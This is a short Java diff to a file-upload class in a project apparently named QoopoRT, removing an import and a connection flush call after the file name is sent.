@@ -13,7 +13,6 @@ import network.Conexion;
 import qooport.Global;
 import qooport.asociado.Asociado;
 import qooport.avanzado.QoopoRT;
-import qooport.modulos.archivos.transferencia.Transferencia;
 import qooport.utilidades.Util;
 import qooport.utilidades.contador.ContadorBPS;
 
@@ -106,7 +105,6 @@ public class Carga extends Transferencia {
             }
             String nombre = archivo.getName();
             conexion.escribirObjeto(Util.texto(nombre));
-            conexion.flush();
             try {
                 setIcono(new ImageIcon(Util.sacarIcono(archivo)));
             } catch (Exception e) {
